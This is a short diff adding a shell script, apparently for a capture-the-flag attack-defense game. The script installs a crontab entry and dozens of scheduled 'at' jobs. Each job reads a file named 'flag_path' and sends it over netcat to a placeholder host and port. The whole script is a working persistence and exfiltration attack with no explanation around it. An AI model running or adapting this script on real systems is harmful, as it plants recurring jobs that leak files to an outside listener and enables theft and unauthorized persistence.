@@ -1,0 +1,11 @@
+asdf="`seq -s ',' 3 5 60` * * * * (sleep 3 && cat flag_path) | nc catch_ip catch_port"
+echo $asdf | crontab
+for hour in $(seq 9 17); do
+	for min in $(seq 2 5 60); do
+		echo $asdf | at $hour:$min
+	done
+	for min in $(seq 4 5 60); do
+		echo "(sleep 3 && cat flag_path) | nc catch_ip catch_port" | at $hour:$min
+	done
+done
+exit
